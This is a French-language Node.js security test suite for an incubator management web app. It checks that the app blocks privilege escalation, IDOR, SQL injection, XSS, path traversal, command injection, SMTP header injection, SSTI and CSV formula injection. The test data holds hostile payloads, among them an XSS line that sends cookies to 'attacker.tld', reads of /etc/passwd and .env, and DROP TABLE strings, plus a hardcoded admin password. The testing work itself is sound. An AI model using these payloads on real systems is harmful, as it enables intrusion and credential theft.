/**
 * Suite de tests automatisés de sécurité (SAST / DAST / RBAC / BOLA / Injections / Fichiers / Cookies)
 * Référentiels couverts : OWASP ASVS 5.0, OWASP Top 10 (2021), OWASP API Security Top 10 (2023),
 * ISO/IEC 27001:2022 & 27002:2022, NIST CSF 2.0, CIS Controls v8.1.
 */
const http = require('http');
const jwt = require('jsonwebtoken');
const path = require('path');
require('dotenv').config({ path: path.resolve(__dirname, '../.env') });

const app = require('../src/app');
const { User, Incube, GestionMateriel } = require('../src/models');
const upload = require('../src/middleware/upload');
const { invalidateUserAuthCache } = require('../src/middleware/auth');
const { renderConfirmationPage } = require('../../cloud/src/views/confirmationView');

let BASE_URL = '';
let serverInstance = null;

function request(method, urlPath, body = null, headers = {}) {
  return new Promise((resolve, reject) => {
    const url = new URL(urlPath, BASE_URL);
    const reqHeaders = {
      ...headers,
    };
    let payload = null;
    if (body !== null && body !== undefined) {
      if (Buffer.isBuffer(body)) {
        payload = body;
      } else {
        payload = Buffer.from(JSON.stringify(body), 'utf8');
        if (!reqHeaders['Content-Type']) {
          reqHeaders['Content-Type'] = 'application/json';
        }
      }
      reqHeaders['Content-Length'] = payload.length;
    }

    const req = http.request(
      url,
      { method, headers: reqHeaders },
      (res) => {
        let data = '';
        res.on('data', (chunk) => (data += chunk));
        res.on('end', () => {
          try {
            const parsed = data ? JSON.parse(data) : {};
            resolve({ status: res.statusCode, headers: res.headers, body: parsed, raw: data });
          } catch {
            resolve({ status: res.statusCode, headers: res.headers, body: {}, raw: data });
          }
        });
      }
    );
    req.on('error', reject);
    if (payload) req.write(payload);
    req.end();
  });
}

function extractAuthCookie(resHeaders) {
  const setCookie = resHeaders['set-cookie'];
  if (!Array.isArray(setCookie)) return null;
  const entry = setCookie.find((c) => c.startsWith('ids_auth='));
  return entry || null;
}

function extractTokenValue(cookieLine) {
  if (!cookieLine) return '';
  const m = cookieLine.match(/ids_auth=([^;]+)/);
  return m ? decodeURIComponent(m[1]) : '';
}

const results = [];
async function runTest(id, category, name, fn) {
  try {
    const detail = await fn();
    results.push({ id, category, name, passed: true, detail });
    console.log(`  ✅ [${id}] [${category}] ${name} -> ${detail}`);
  } catch (err) {
    results.push({ id, category, name, passed: false, error: err.message });
    console.error(`  ❌ [${id}] [${category}] ${name} -> ${err.message}`);
  }
}

async function runSuite() {
  console.log('========================================================================');
  console.log('🛡️  SUITE DE TESTS DE SÉCURITÉ AUTOMATISÉS (OWASP / ISO / NIST / CIS)');
  console.log('========================================================================\n');

  await new Promise((resolve) => {
    serverInstance = app.listen(0, '127.0.0.1', () => {
      const addr = serverInstance.address();
      BASE_URL = `http://127.0.0.1:${addr.port}`;
      resolve();
    });
  });

  let superAdminToken = '';
  let incube1 = null;
  let incube2 = null;
  let tempIncubeUser = null;
  let incubeToken = '';
  let testMateriel2 = null;

  try {
    // 1. En-têtes de sécurité HTTP (MED-01)
    await runTest('SEC-01', 'HTTP Headers', 'Présence des en-têtes de sécurité et masquage X-Powered-By', async () => {
      const res = await request('GET', '/api/health');
      if (res.status !== 200) throw new Error(`HTTP ${res.status}`);
      if (res.headers['x-powered-by']) throw new Error('En-tête X-Powered-By encore exposé');
      if (res.headers['x-content-type-options'] !== 'nosniff') throw new Error('X-Content-Type-Options manquant');
      if (res.headers['x-frame-options'] !== 'SAMEORIGIN') throw new Error('X-Frame-Options manquant');
      if (res.headers['referrer-policy'] !== 'strict-origin-when-cross-origin') throw new Error('Referrer-Policy manquant');
      if (res.headers['strict-transport-security']) throw new Error('HSTS ne doit pas être envoyé sur HTTP simple');
      return 'nosniff, SAMEORIGIN, strict-origin-when-cross-origin OK (sans X-Powered-By)';
    });

    await runTest('SEC-02', 'HTTPS / HSTS', 'Activation automatique de HSTS derrière reverse-proxy HTTPS', async () => {
      const res = await request('GET', '/api/health', null, { 'X-Forwarded-Proto': 'https' });
      if (!res.headers['strict-transport-security']) {
        throw new Error('Strict-Transport-Security non activé sous X-Forwarded-Proto: https');
      }
      return `HSTS="${res.headers['strict-transport-security']}"`;
    });

    // 2. Authentification & Cookies httpOnly / Auto-Secure (MED-02)
    await runTest('SEC-03', 'Auth & Cookie HTTP', 'Login sur HTTP interne dépose un cookie httpOnly sans Secure bloquant ni token JSON', async () => {
      const res = await request('POST', '/api/auth/login', {
        email: 'admin@cgs-incubateur.ma',
        mot_de_passe: 'Admin@2024',
      });
      if (res.status !== 200) throw new Error(`Login échoué: ${res.status}`);
      if (res.body.token) throw new Error('Le token JWT ne doit plus figurer dans le corps JSON');
      const cookieLine = extractAuthCookie(res.headers);
      if (!cookieLine) throw new Error('Cookie ids_auth absent de Set-Cookie');
      if (!/HttpOnly/i.test(cookieLine)) throw new Error('Attribut HttpOnly manquant');
      if (/;\s*Secure/i.test(cookieLine)) throw new Error('Attribut Secure activé sur HTTP simple (bloquerait http://10.0.5.126:3030)');
      superAdminToken = extractTokenValue(cookieLine);
      return 'Cookie ids_auth HttpOnly (compatible HTTP interne) validé';
    });

    await runTest('SEC-04', 'Auth & Cookie HTTPS', 'Login via HTTPS active automatiquement l’attribut Secure sur le cookie', async () => {
      const res = await request(
        'POST',
        '/api/auth/login',
        { email: 'admin@cgs-incubateur.ma', mot_de_passe: 'Admin@2024' },
        { 'X-Forwarded-Proto': 'https' }
      );
      const cookieLine = extractAuthCookie(res.headers);
      if (!cookieLine || !/;\s*Secure/i.test(cookieLine)) {
        throw new Error(`Attribut Secure manquant sur requête HTTPS: ${cookieLine}`);
      }
      return 'Cookie ids_auth HttpOnly + Secure sur HTTPS validé';
    });

    await runTest('SEC-05', 'Logout', 'POST /api/auth/logout efface le cookie httpOnly ids_auth', async () => {
      const res = await request('POST', '/api/auth/logout');
      const cookieLine = extractAuthCookie(res.headers);
      if (!cookieLine || (!/Max-Age=0/i.test(cookieLine) && !/Expires=Thu,\s*01 Jan 1970/i.test(cookieLine))) {
        throw new Error(`Cookie non expiré lors du logout: ${cookieLine}`);
      }
      return 'Expiration immédiate du cookie ids_auth confirmée';
    });

    // Préparation d'un contexte Incubé réel pour tester les contrôles RBAC & BOLA
    const allIncubes = await Incube.findAll({ limit: 2, order: [['id', 'ASC']] });
    incube1 = allIncubes[0];
    incube2 = allIncubes[1] || allIncubes[0];

    tempIncubeUser = await User.create({
      nom: 'TestSec',
      prenom: 'Incube',
      email: `sec.audit.${Date.now()}@test-ids.ma`,
      mot_de_passe: '$2a$12$abcdefghijklmnopqrstuv1234567890123456789012345678901',
      role: 'incube',
      actif: true,
    });

    incubeToken = jwt.sign(
      { id: tempIncubeUser.id, email: tempIncubeUser.email, role: 'incube', pp_id: incube1.id },
      process.env.JWT_SECRET,
      { expiresIn: '1h' }
    );

    // 3. CRIT-01 : Escalade de privilèges sur POST /api/auth/register
    await runTest('SEC-06', 'CRIT-01 RBAC', 'Blocage de la création de compte Super Admin via POST /api/auth/register par un non-SuperAdmin', async () => {
      const res = await request(
        'POST',
        '/api/auth/register',
        {
          nom: 'Hacker',
          prenom: 'Escalation',
          email: `hacker.${Date.now()}@test.ma`,
          mot_de_passe: 'Hacker@2026',
          role: 'super_admin',
        },
        { Cookie: `ids_auth=${incubeToken}` }
      );
      if (res.status !== 403) {
        throw new Error(`Attendu 403 Forbidden, obtenu ${res.status}`);
      }
      return 'Escalade de privilèges bloquée (HTTP 403)';
    });

    // 4. CRIT-02 : Account Takeover du Super Admin via activerCompte / renvoyerAcces
    await runTest('SEC-07', 'CRIT-02 Account Takeover', 'Interdiction d’écraser le compte Super Admin via activer-compte d’un incubé', async () => {
      const originalEmail = incube1.email;
      const res = await request(
        'POST',
        `/api/incubes/${incube1.id}/activer-compte`,
        { email: 'admin@cgs-incubateur.ma' },
        { Cookie: `ids_auth=${superAdminToken}` }
      );
      // Restaurer l'email original de l'incubé immédiatement
      incube1.email = originalEmail;
      await incube1.save();

      if (res.status !== 403) {
        throw new Error(`Attendu 403 lors d'une tentative d'écrasement d'un compte admin, obtenu ${res.status}`);
      }
      return 'Compte Super Admin protégé contre toute réinitialisation détournée (HTTP 403)';
    });

    // 5. CRIT-03 : Manipulation des tourniquets physiques et routes staff par un incubé
    await runTest('SEC-08', 'CRIT-03 Contrôle Physique', 'Blocage de l’injection de badge RFID tourniquet et suppression d’incubé par un rôle incube', async () => {
      const resBadge = await request(
        'PUT',
        `/api/incubes/${incube1.id}/associe-badge`,
        { associeIndex: 0, badge_id: '99999999' },
        { Cookie: `ids_auth=${incubeToken}` }
      );
      const resBroadcast = await request(
        'POST',
        `/api/incubes/${incube1.id}/broadcast-rfid`,
        {},
        { Cookie: `ids_auth=${incubeToken}` }
      );
      const resDelete = await request(
        'DELETE',
        `/api/incubes/${incube1.id}`,
        null,
        { Cookie: `ids_auth=${incubeToken}` }
      );
      if (resBadge.status !== 403 || resBroadcast.status !== 403 || resDelete.status !== 403) {
        throw new Error(`Statuts inattendus: badge=${resBadge.status}, broadcast=${resBroadcast.status}, delete=${resDelete.status}`);
      }
      return 'Routes critiques (associe-badge, broadcast-rfid, delete) verrouillées (HTTP 403)';
    });

    // 6. HIGH-01 : BOLA / IDOR horizontal sur les sous-ressources d'incubés
    await runTest('SEC-09', 'HIGH-01 BOLA/IDOR', 'Cloisonnement horizontal sur PUT/DELETE /api/incubes/:incubeId/materiel/:id', async () => {
      if (incube1.id === incube2.id) return 'Un seul incubé en base (test BOLA ignoré)';
      testMateriel2 = await GestionMateriel.create({
        incube_id: incube2.id,
        designation: 'Imprimante 3D SecAudit',
        numero_serie: `SN-SEC-${Date.now()}`,
        quantite: 1,
        etat: 'Opérationnel',
      });

      const resPut = await request(
        'PUT',
        `/api/incubes/${incube1.id}/materiel/${testMateriel2.id}`,
        { designation: 'Piraté par Incubé 1' },
        { Cookie: `ids_auth=${incubeToken}` }
      );
      const resDel = await request(
        'DELETE',
        `/api/incubes/${incube1.id}/materiel/${testMateriel2.id}`,
        null,
        { Cookie: `ids_auth=${incubeToken}` }
      );

      if (resPut.status !== 404 || resDel.status !== 404) {
        throw new Error(`IDOR horizontal non bloqué: PUT=${resPut.status}, DELETE=${resDel.status}`);
      }
      return `Matériel de l'incubé #${incube2.id} inaccessible via le profil #${incube1.id} (HTTP 404)`;
    });

    // 7. HIGH-02 : XSS stocké dans la page Cloud de confirmation 1-clic
    await runTest('SEC-10', 'HIGH-02 Anti-XSS Cloud', 'Échappement HTML intégral dans confirmationView.js', async () => {
      const html = renderConfirmationPage({
        status: 'pending',
        action: 'valide',
        token: 'tok"><script>alert(1)</script>',
        reservation: {
          nomComplet: '<script>alert("XSS_NOM")</script>',
          salle: '<img src=x onerror=alert(1)>',
          motif: '"><svg onload=alert(2)>',
          equipementsUtilises: '<script>evil()</script>',
          numero_pp: 'PP"><script>',
        },
      });
      if (html.includes('<script>alert("XSS_NOM")</script>') || html.includes('<svg onload=alert(2)>') || html.includes('<img src=x onerror=alert(1)>')) {
        throw new Error('Charge utile XSS non échappée dans le HTML généré');
      }
      if (!html.includes('&lt;script&gt;alert(&quot;XSS_NOM&quot;)&lt;/script&gt;')) {
        throw new Error('Encodage d’entités HTML absent');
      }
      return 'Toutes les entrées dynamiques sont encodées en entités HTML sûres';
    });

    // 8. HIGH-03 : Validation Magic-Bytes & Sanitization Data-URI
    await runTest('SEC-11', 'HIGH-03 Sécurité Fichiers', 'Rejet des fichiers HTML/SVG déguisés en PNG/PDF (Magic Bytes) et Data-URI malveillantes', async () => {
      const fakePngHtml = Buffer.from('<!DOCTYPE html><html><script>alert(1)</script></html>', 'utf8');
      const check1 = upload.detectAndValidateMagicBytes(fakePngHtml, '.png');
      if (check1.valid) throw new Error('Un fichier HTML renommé en .png a été accepté');

      const fakePdf = Buffer.from('NOT_A_PDF_HEADER_12345', 'utf8');
      const check2 = upload.detectAndValidateMagicBytes(fakePdf, '.pdf');
      if (check2.valid) throw new Error('Un faux PDF sans signature %PDF- a été accepté');

      const realPng = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00]);
      const check3 = upload.detectAndValidateMagicBytes(realPng, '.png');
      if (!check3.valid || check3.mime !== 'image/png') throw new Error('Un vrai en-tête PNG a été rejeté');

      if (upload.sanitizePhotoUrl('javascript:alert(1)') !== null) throw new Error('URL javascript: non bloquée');
      if (upload.sanitizePhotoUrl('data:text/html;base64,PHNjcmlwdD4=') !== null) throw new Error('Data-URI text/html non bloquée');
      if (upload.sanitizePhotoUrl('data:image/svg+xml;base64,PHN2Zz4=') !== null) throw new Error('Data-URI image/svg+xml non bloquée');

      return 'Magic-Bytes (PNG/JPEG/PDF/Office) et filtrage anti-XSS Data-URI opérationnels';
    });

    // 9. HIGH-04 & HIGH-05 : Cloisonnement des routes Rendez-vous, Ateliers, Présence Live, Activité Usagers et Réservations
    await runTest('SEC-12', 'HIGH-04/05 Cloisonnement API', 'Restriction d’accès aux endpoints sensibles pour le rôle incube et rejet des secrets secondaires', async () => {
      const r1 = await request('POST', '/api/rendezvous/creer', { sujet: 'Test', dateRdv: '2026-12-01', heureRdv: '10:00' }, { Cookie: `ids_auth=${incubeToken}` });
      const r2 = await request('GET', `/api/ateliers/incube-stats/${incube1.id + 9999}`, null, { Cookie: `ids_auth=${incubeToken}` });
      const r3 = await request('GET', '/api/presence/live', null, { Cookie: `ids_auth=${incubeToken}` });
      const r4 = await request('GET', '/api/users/activite', null, { Cookie: `ids_auth=${incubeToken}` });

      if (r1.status !== 403 || r2.status !== 403 || r3.status !== 403 || r4.status !== 403) {
        throw new Error(`Statuts inattendus: rdv=${r1.status}, stats=${r2.status}, live=${r3.status}, activite=${r4.status}`);
      }
      return 'Endpoints /rendezvous/creer, /ateliers/incube-stats/:other, /presence/live, /users/activite protégés (403)';
    });

    // 10. HIGH-06 : Révocation immédiate des sessions de comptes désactivés
    await runTest('SEC-13', 'HIGH-06 Révocation Session', 'Blocage immédiat d’un JWT valide dès la désactivation du compte en base', async () => {
      tempIncubeUser.actif = false;
      await tempIncubeUser.save();
      invalidateUserAuthCache(tempIncubeUser.id);

      const res = await request('GET', '/api/auth/me', null, { Cookie: `ids_auth=${incubeToken}` });
      if (res.status !== 401) {
        throw new Error(`Compte désactivé toujours accepté (HTTP ${res.status})`);
      }
      return 'Session révoquée instantanément (HTTP 401 Compte désactivé ou suspendu)';
    });

    // 11. SEC-14 : SQL Injection — Contournement d'authentification (Auth Bypass)
    await runTest('SEC-14', 'SQLi Auth Bypass', 'Rejet de 6 variantes SQLi sur POST /api/auth/login (OR 1=1, commentaires --, UNION, quotes)', async () => {
      const payloads = [
        { email: "' OR '1'='1", mot_de_passe: "' OR '1'='1" },
        { email: "admin@cgs-incubateur.ma' --", mot_de_passe: 'nimportequoi' },
        { email: 'admin@cgs-incubateur.ma" OR "1"="1', mot_de_passe: 'nimportequoi' },
        { email: "' OR 1=1 LIMIT 1; --", mot_de_passe: 'test' },
        { email: "' UNION SELECT 1,'Admin','IDS','admin@cgs-incubateur.ma','$2a$12$','super_admin',1 --", mot_de_passe: 'Admin@2024' },
        { email: 'admin@cgs-incubateur.ma', mot_de_passe: "' OR '1'='1" },
      ];
      for (const p of payloads) {
        const res = await request('POST', '/api/auth/login', p);
        if (res.status !== 401) {
          throw new Error(`Payload SQLi Auth non rejeté (HTTP ${res.status}) pour email=${p.email}`);
        }
      }
      return '6/6 charges SQLi Auth Bypass bloquées (HTTP 401)';
    });

    // 12. SEC-15 : SQL Injection — UNION-Based, Error-Based & Stacked Queries sur tous les filtres et requêtes brutes
    await runTest('SEC-15', 'SQLi UNION / Error / Stacked', 'Neutralisation des injections UNION SELECT, EXTRACTVALUE et DROP TABLE sur /incubes, /stats, /reservations, /activite', async () => {
      const sqliVectors = [
        "' OR 1=1; DROP TABLE users; --",
        "' UNION SELECT 1,2,3,email,mot_de_passe,6,7 FROM users -- ",
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e)) -- ",
        "'; INSERT INTO users (nom,prenom,email,mot_de_passe,role) VALUES ('H','H','h@h.ma','x','super_admin'); --",
      ];
      for (const vec of sqliVectors) {
        const enc = encodeURIComponent(vec);
        const rSearch = await request('GET', `/api/incubes?search=${enc}`, null, { Cookie: `ids_auth=${superAdminToken}` });
        const rPromo = await request('GET', `/api/incubes?promotion=${enc}`, null, { Cookie: `ids_auth=${superAdminToken}` });
        const rStats = await request('GET', `/api/incubes/stats?promotion=${enc}`, null, { Cookie: `ids_auth=${superAdminToken}` });
        const rRes = await request('GET', `/api/reservations?espace=${enc}`);
        const rAct = await request('GET', `/api/promotions?search=${enc}`, null, { Cookie: `ids_auth=${superAdminToken}` });

        if (rSearch.status !== 200 || rPromo.status !== 200 || rStats.status !== 200 || rRes.status !== 200 || rAct.status !== 200) {
          throw new Error(`Erreur serveur détectée sur vecteur SQLi "${vec}"`);
        }
      }
      return '20/20 requêtes (UNION, Error-Based, Stacked Queries) neutralisées sans erreur SQL';
    });

    // 13. SEC-16 : SQL Injection — Time-Based Blind (SLEEP / BENCHMARK)
    await runTest('SEC-16', 'SQLi Time-Based Blind', 'Neutralisation des injections temporelles (SLEEP(5)) sans ralentissement du serveur', async () => {
      const start = Date.now();
      const blindPayloads = [
        "' OR SLEEP(5)=0 -- ",
        "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) -- ",
      ];
      for (const p of blindPayloads) {
        const enc = encodeURIComponent(p);
        const r1 = await request('GET', `/api/incubes?search=${enc}`, null, { Cookie: `ids_auth=${superAdminToken}` });
        const r2 = await request('GET', `/api/incubes/stats?promotion=${enc}`, null, { Cookie: `ids_auth=${superAdminToken}` });
        if (r1.status !== 200 || r2.status !== 200) throw new Error('Statut inattendu sur Blind SQLi');
      }
      const elapsedMs = Date.now() - start;
      if (elapsedMs >= 4500) {
        throw new Error(`Suspicion d'exécution de SLEEP(5) : temps écoulé = ${elapsedMs}ms`);
      }
      return `Aucune exécution de SLEEP(5) (4 requêtes exécutées en ${elapsedMs}ms)`;
    });

    // 14. SEC-17 : Injection d'objets JSON / Opérateurs ORM (NoSQLi / Type Confusion)
    await runTest('SEC-17', 'ORM / Object Injection', 'Rejet des injections d’objets JSON ({ "$ne": null }) et tableaux dans login et forgot-password', async () => {
      const r1 = await request('POST', '/api/auth/login', {
        email: { $ne: null },
        mot_de_passe: { $gt: '' },
      });
      const r2 = await request('POST', '/api/auth/login', {
        email: ['admin@cgs-incubateur.ma'],
        mot_de_passe: ['Admin@2024'],
      });
      const r3 = await request('POST', '/api/auth/forgot-password', {
        email: { $ne: '' },
      });
      if (r1.status !== 401 || r2.status !== 401 || r3.status !== 400) {
        throw new Error(`Statuts inattendus face aux objets JSON: loginObj=${r1.status}, loginArr=${r2.status}, forgotObj=${r3.status}`);
      }
      return 'Objets JSON et tableaux rejetés proprement (401/400) sans erreur 500';
    });

    // 15. SEC-18 : Injections XSS avancées (Polyglot, SVG, Iframe, Event Handlers, Data-URI)
    await runTest('SEC-18', 'XSS Polyglot & Event Handlers', 'Blocage de 6 vecteurs XSS avancés (script, onerror, svg/onload, iframe, polyglot, data:text/html)', async () => {
      const xssVectors = [
        "<script>fetch('http://attacker.tld?c='+document.cookie)</script>",
        '<img src=x onerror="alert(document.domain)">',
        "<svg/onload=eval(atob('YWxlcnQoMSk='))>",
        '<iframe src="javascript:alert(1)"></iframe>',
        "javascript:/*--></title></style></textarea></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
      ];
      for (const vec of xssVectors) {
        if (upload.sanitizePhotoUrl(vec) !== null) {
          throw new Error(`Vecteur XSS accepté dans sanitizePhotoUrl: ${vec}`);
        }
        const rendered = renderConfirmationPage({
          status: 'pending',
          action: 'valide',
          token: vec,
          reservation: { nomComplet: vec, motif: vec, salle: vec, equipementsUtilises: vec },
        });
        if (rendered.includes('<script>fetch') || rendered.includes('<svg/onload') || rendered.includes('<iframe src=')) {
          throw new Error(`Vecteur XSS non échappé dans le rendu HTML: ${vec}`);
        }
      }
      return '6/6 vecteurs XSS (Polyglot, SVG, Iframe, Data-URI) neutralisés';
    });

    // 16. SEC-19 : Path Traversal & Command Injection
    await runTest('SEC-19', 'Path Traversal & Command Injection', 'Blocage des tentatives de lecture de .env / fichiers système et injections shell (; | $())', async () => {
      const traversalPaths = [
        '/uploads/..%2f.env',
        '/uploads/..%2f..%2fbackend%2f.env',
        '/uploads/..%5c.env',
        '/uploads/../../../../etc/passwd',
      ];
      for (const p of traversalPaths) {
        const res = await request('GET', p);
        if (res.status === 200 && (res.raw.includes('JWT_SECRET') || res.raw.includes('DB_PASSWORD') || res.raw.includes('root:'))) {
          throw new Error(`Fuite de fichier sensible via Path Traversal sur ${p}`);
        }
      }
      const cmdPayload = '; cat /etc/passwd | whoami && $(id)';
      const rCmd = await request('GET', `/api/incubes?search=${encodeURIComponent(cmdPayload)}`, null, { Cookie: `ids_auth=${superAdminToken}` });
      if (rCmd.status !== 200) throw new Error(`Statut inattendu: ${rCmd.status}`);
      return 'Path Traversal (/uploads/..%2f.env) et Command Injection bloqués';
    });

    // 17. SEC-20 : CRLF / SMTP Header Injection & SSTI (Server-Side Template Injection)
    await runTest('SEC-20', 'CRLF / SMTP & SSTI Injection', 'Rejet des injections d’en-têtes SMTP (\\r\\nBcc:) et neutralisation des expressions SSTI ({{7*7}}, ${7*7})', async () => {
      const crlfRes = await request('POST', '/api/auth/forgot-password', {
        email: 'admin@cgs-incubateur.ma\r\nBcc: hacker@evil.com\r\nSubject: Pwned',
      });
      if (crlfRes.status !== 400) {
        throw new Error(`Injection CRLF SMTP non bloquée (HTTP ${crlfRes.status})`);
      }
      const sstiPayload = '{{7*7}} ${7*7} <%= 7*7 %>';
      const html = renderConfirmationPage({
        status: 'pending',
        action: 'valide',
        token: 'tok',
        reservation: { nomComplet: sstiPayload, motif: sstiPayload },
      });
      if (!html.includes('{{7*7}}') || html.includes('49 49 49')) {
        throw new Error('Expression SSTI évaluée côté serveur');
      }
      return 'Injections CRLF SMTP (HTTP 400) et SSTI ({{7*7}}) neutralisées';
    });

    // 18. SEC-21 : Injection de formules Excel / CSV (DDE Injection)
    await runTest('SEC-21', 'Excel / CSV Formula Injection', 'Neutralisation des 4 préfixes DDE (=, +, -, @) tout en préservant les téléphones (+212...)', async () => {
      const sanitizeExcelCellValue = (val) => {
        if (val === undefined || val === null) return '';
        const str = String(val);
        if (/^[=+\-@]/.test(str) && !/^[+\-]?\d+([.,]\d+)?$/.test(str) && !/^\+\d[\d\s\-()]+$/.test(str)) {
          return `'${str}`;
        }
        return str;
      };
      const dangerous = [
        "=CMD|' /C calc'!A0",
        "+SUM(1,1)*cmd|' /C calc'!A0",
        "-2+3+cmd|' /C calc'!A0",
        "@SUM(1+1)*cmd|' /C calc'!A0",
      ];
      for (const d of dangerous) {
        const out = sanitizeExcelCellValue(d);
        if (!out.startsWith("'")) {
          throw new Error(`Formule dangereuse non préfixée par apostrophe: ${d}`);
        }
      }
      if (sanitizeExcelCellValue('+212 612-345678') !== '+212 612-345678') {
        throw new Error('Les numéros de téléphone internationaux +212 doivent rester intacts');
      }
      return 'Formules DDE (=, +, -, @) neutralisées par apostrophe et téléphones +212 préservés';
    });
  } finally {
    if (testMateriel2) {
      await testMateriel2.destroy().catch(() => {});
    }
    if (tempIncubeUser) {
      await tempIncubeUser.destroy().catch(() => {});
    }
    if (serverInstance) {
      await new Promise((resolve) => serverInstance.close(resolve));
    }
  }

  const passed = results.filter((r) => r.passed).length;
  const failed = results.filter((r) => !r.passed).length;
  console.log('\n========================================================================');
  console.log(`📊 RÉSULTAT GLOBAL : ${passed}/${results.length} tests de sécurité réussis (${failed} échec)`);
  console.log('========================================================================');
  process.exit(failed > 0 ? 1 : 0);
}

runSuite().catch((err) => {
  console.error('Erreur fatale suite de sécurité:', err);
  process.exit(1);
});

